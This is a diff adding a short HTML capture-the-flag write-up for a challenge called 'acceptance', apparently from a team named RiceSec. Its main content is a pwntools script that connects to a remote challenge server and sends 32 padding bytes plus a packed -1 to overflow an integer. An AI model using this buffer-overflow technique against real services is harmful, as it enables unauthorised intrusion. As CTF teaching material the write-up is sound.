@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+	<meta charset="UTF-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+	<title>RiceSec</title>
+
+	<link href="/writeups/css/prism-one-light.css" rel="stylesheet" />
+	<link rel="stylesheet" href="/writeups/css/style.css" />
+</head>
+
+
+	<body>
+		
+<header>
+	<nav>
+		<b>RiceSec</b>
+	</nav>
+</header>
+
+<h1>acceptance</h1>
+
+<p>The decompilation output suggested that we want to overflow one 32-bit integer to have the value <code>-1</code>.</p>
+<pre class="language-py"><code class="language-py"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><br><br>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"20.169.252.240"</span><span class="token punctuation">,</span> <span class="token number">4000</span><span class="token punctuation">)</span><br><br>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><br>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b": "</span><span class="token punctuation">)</span><br><br><span class="token keyword">with</span> context<span class="token punctuation">.</span>local<span class="token punctuation">(</span>signed<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span><br>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">32</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><br><br><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+
+
+
+	</body>
+</html>
